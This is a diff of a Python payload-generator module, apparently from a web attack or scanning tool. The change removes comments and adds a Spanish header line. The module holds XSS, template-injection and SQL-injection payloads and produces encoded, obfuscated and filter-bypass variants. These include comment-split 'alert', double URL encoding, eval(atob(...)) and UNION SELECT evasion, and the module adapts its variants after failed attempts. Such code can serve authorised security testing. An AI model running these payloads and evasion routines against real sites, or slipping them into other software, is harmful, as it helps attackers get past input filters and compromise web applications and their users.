@@ -1,3 +1,5 @@
+# Modulo de escaneo y analisis para generator.
+
 """
 Dynamic Payload Generator
 Creates sophisticated payload variants based on learned patterns and framework detection.
@@ -11,7 +13,7 @@ import string
 class DynamicPayloadGenerator:
     """Generates sophisticated payload variants adapted to target environment."""
 
-    # Payload templates for various injection types
+
     XSS_TEMPLATES = {
         "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
         "event_handler": [
@@ -23,7 +25,7 @@ class DynamicPayloadGenerator:
             "javascript:alert(1)",
             "data:text/html,<script>alert(1)</script>",
         ],
-        "framework_react": ["dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}", 
+        "framework_react": ["dangerouslySetInnerHTML={{__html:'<img src=x onerror=alert(1)>'}}",
                            "eval(atob('YWxlcnQoMSk='))"],
         "framework_angular": ["ng-bind='constructor.prototype.valueOf()'",
                              "{{constructor.prototype.toString()}}"],
@@ -72,7 +74,7 @@ class DynamicPayloadGenerator:
 
     def generate_variants(
         self,
-        attack_type: str,  # xss, sqli, ssti, path_traversal
+        attack_type: str,
         base_payload: str,
         framework: Optional[str] = None,
         detected_filters: Optional[List[str]] = None,
@@ -87,7 +89,7 @@ class DynamicPayloadGenerator:
         if detected_filters:
             self.detected_filters = detected_filters
 
-        # Start with base payload
+
         variants.append(
             {
                 "payload": base_payload,
@@ -98,32 +100,32 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # Generate framework-specific variants
+
         if framework:
             variants.extend(self._framework_specific_variants(attack_type, framework))
 
-        # Generate encoding variants
+
         variants.extend(self._encoding_variants(base_payload, attack_type))
 
-        # Generate obfuscation variants
+
         variants.extend(self._obfuscation_variants(base_payload, attack_type))
 
-        # Generate filter-bypass variants based on detected filters
+
         if self.detected_filters:
             variants.extend(
                 self._filter_bypass_variants(base_payload, self.detected_filters)
             )
 
-        # Generate context-aware variants
+
         variants.extend(self._context_variants(base_payload, attack_type))
 
-        # If previous failures exist, generate adaptive variants
+
         if previous_failures:
             variants.extend(
                 self._adaptive_variants(base_payload, previous_failures)
             )
 
-        return variants[:20]  # Limit to top 20 variants
+        return variants[:20]
 
     def _framework_specific_variants(
         self, attack_type: str, framework: str
@@ -192,7 +194,7 @@ class DynamicPayloadGenerator:
         """Generate variants with different encodings."""
         variants = []
 
-        # URL encoding
+
         url_encoded = "".join([f"%{ord(c):02x}" for c in payload])
         variants.append(
             {
@@ -204,7 +206,7 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # HTML entity encoding
+
         html_encoded = "".join([f"&#x{ord(c):x};" for c in payload])
         variants.append(
             {
@@ -216,7 +218,7 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # Double URL encoding
+
         double_url = "".join([f"%{ord(c):02x}" for c in url_encoded])
         variants.append(
             {
@@ -228,7 +230,7 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # Unicode escaping
+
         unicode_encoded = "".join([f"\\u{ord(c):04x}" for c in payload])
         variants.append(
             {
@@ -240,7 +242,7 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # Hex encoding
+
         hex_encoded = "".join([f"\\x{ord(c):02x}" for c in payload])
         variants.append(
             {
@@ -260,7 +262,7 @@ class DynamicPayloadGenerator:
         """Generate obfuscated variants."""
         variants = []
 
-        # Comment injection
+
         if "alert" in payload:
             obfuscated = payload.replace("alert", "al/**/ert")
             variants.append(
@@ -273,7 +275,7 @@ class DynamicPayloadGenerator:
                 }
             )
 
-        # Random case
+
         mixed_case = "".join(
             [c.upper() if random.random() > 0.5 else c for c in payload]
         )
@@ -287,7 +289,7 @@ class DynamicPayloadGenerator:
             }
         )
 
-        # Split payload across concatenation
+
         if len(payload) > 10:
             parts = [payload[i : i + 3] for i in range(0, len(payload), 3)]
             split = "".join([f"'{p}'" if i == 0 else f"+'{p}'" for i, p in enumerate(parts)])
@@ -311,7 +313,7 @@ class DynamicPayloadGenerator:
 
         for filter_name in filters:
             if "alert" in filter_name.lower():
-                # Bypass alert() blocking
+
                 variants.extend(
                     [
                         {
@@ -332,7 +334,7 @@ class DynamicPayloadGenerator:
                 )
 
             if "script" in filter_name.lower():
-                # Bypass <script> tag blocking
+
                 variants.extend(
                     [
                         {
@@ -353,7 +355,7 @@ class DynamicPayloadGenerator:
                 )
 
             if "union" in filter_name.lower() or "select" in filter_name.lower():
-                # Bypass UNION SELECT filtering
+
                 variants.extend(
                     [
                         {
@@ -429,15 +431,15 @@ class DynamicPayloadGenerator:
         """Generate variants based on previous failure patterns."""
         variants = []
 
-        # Analyze what failed before
+
         failed_techniques = set()
         for failure in previous_failures[-5:]:
             if failure.get("result") != "success":
                 failed_techniques.add(failure.get("variant", "unknown"))
 
-        # Generate counter-variants
+
         if "original" in failed_techniques:
-            # Original failed, try variants
+
             variants.append(
                 {
                     "payload": f"eval(atob('{self._to_base64(payload)}'))",
@@ -449,7 +451,7 @@ class DynamicPayloadGenerator:
             )
 
         if "url_encoded" in failed_techniques:
-            # URL encoding failed, try HTML
+
             html_encoded = "".join([f"&#x{ord(c):x};" for c in payload])
             variants.append(
                 {
